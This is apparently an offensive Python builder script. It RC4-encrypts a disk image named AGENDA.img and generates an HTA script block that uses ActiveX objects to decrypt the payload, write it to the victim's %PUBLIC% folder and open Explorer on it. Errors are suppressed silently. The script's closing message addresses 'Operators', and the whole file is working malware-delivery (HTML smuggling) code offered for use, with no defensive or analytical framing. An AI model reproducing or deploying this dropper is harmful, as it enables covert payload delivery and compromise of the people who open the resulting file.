import os
import base64

RC4_KEY = b'-4S@aAv;&T~2\\.e+3])N`C|"\\.3FTVH8NG5O$Hjh+~s^g\'G06ni"n{E2cujo"w^lnmZo)i!I6U:i}k~(xy,ftS~v%"FTq)<@V%8uG?P@))V%@xOHovWgtA5n/.vj1C+W3G7K=<2ZX\'{Q&Y80Ql{?tS}SwzR.MKrz1<gKCV$"t=OP<8N$<jQ\'=Lt(HPI\\*u4yZ(~v_pY3{TDFlb^^Y`Tlac3mPRbHlZNh{Y% o{y`q[r5fQOv$}`Q?oLvX,YWp+~,'

def rc4(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    out = bytearray(len(data))
    i = 0
    j = 0
    for idx in range(len(data)):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out[idx] = data[idx] ^ S[(S[i] + S[j]) % 256]
    return out

def main():
    img_path = 'AGENDA.img'
    out_js = 'payload_script.html'
    
    if not os.path.exists(img_path):
        print(f"[!] File not found: {img_path}")
        return

    with open(img_path, 'rb') as f:
        pt = f.read()
    
    print("[*] Encrypting payload...")
    ct = rc4(RC4_KEY, pt)
    
    print("[*] Base64 encoding...")
    b64_key = base64.b64encode(RC4_KEY).decode('utf-8')
    b64_ct = base64.b64encode(ct).decode('utf-8')
    
    print(f"[*] Writing clean script block to {out_js}...")
    
    script_content = f"""<script>
function triggerPayload(e) {{
    if (e) e.preventDefault();
    if (location.protocol !== "file:" && location.protocol !== "mk:") return;

    try {{
        var encB64 = "{b64_ct}";
        var keyB64 = "{b64_key}";

        var xml = new ActiveXObject("MSXML2.DOMDocument");
        
        var keyEl = xml.createElement("k");
        keyEl.dataType = "bin.base64";
        keyEl.text = keyB64;
        var keyBytes = new VBArray(keyEl.nodeTypedValue).toArray();

        var el = xml.createElement("b64");
        el.dataType = "bin.base64";
        el.text = encB64;
        var ctBytes = new VBArray(el.nodeTypedValue).toArray();
        
        var S = new Array(256);
        for (var i = 0; i < 256; i++) S[i] = i;
        var j = 0;
        for (var i = 0; i < 256; i++) {{
            j = (j + S[i] + keyBytes[i % keyBytes.length]) & 255;
            var t = S[i]; S[i] = S[j]; S[j] = t;
        }}
        
        var b64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var ptB64 = [];
        var chunkStr = "";
        var i_idx = 0, j_idx = 0;
        
        for (var i = 0; i < ctBytes.length; i += 3) {{
            var chunk = [0,0,0];
            for (var k = 0; k < 3; k++) {{
                if (i + k < ctBytes.length) {{
                    i_idx = (i_idx + 1) & 255;
                    j_idx = (j_idx + S[i_idx]) & 255;
                    var t = S[i_idx]; S[i_idx] = S[j_idx]; S[j_idx] = t;
                    chunk[k] = ctBytes[i + k] ^ S[(S[i_idx] + S[j_idx]) & 255];
                }}
            }}
            
            var e1 = chunk[0] >> 2;
            var e2 = ((chunk[0] & 3) << 4) | (chunk[1] >> 4);
            var e3 = ((chunk[1] & 15) << 2) | (chunk[2] >> 6);
            var e4 = chunk[2] & 63;
            
            chunkStr += b64Chars.charAt(e1) + b64Chars.charAt(e2) + 
                     (i + 1 < ctBytes.length ? b64Chars.charAt(e3) : "=") + 
                     (i + 2 < ctBytes.length ? b64Chars.charAt(e4) : "=");
                     
            if (chunkStr.length > 16384) {{
                ptB64.push(chunkStr);
                chunkStr = "";
            }}
        }}
        if (chunkStr.length > 0) ptB64.push(chunkStr);
        el.text = ptB64.join("");
        
        var ws = new ActiveXObject("WScript.Shell");
        var dropPath = ws.ExpandEnvironmentStrings("%PUBLIC%") + "\\\\AGENDA.img";
        
        var streamOut = new ActiveXObject("ADODB.Stream");
        streamOut.Type = 1;
        streamOut.Open();
        streamOut.Write(el.nodeTypedValue);
        streamOut.SaveToFile(dropPath, 2);
        streamOut.Close();

        ws.Run('explorer.exe /select,"' + dropPath + '"');
    }} catch(err) {{}}
}}
</script>"""

    with open(out_js, 'w') as f:
        f.write(script_content)
        
    print("[+] Done! Operators can now copy the contents of payload_script.html into index.hta")

if __name__ == '__main__':
    main()
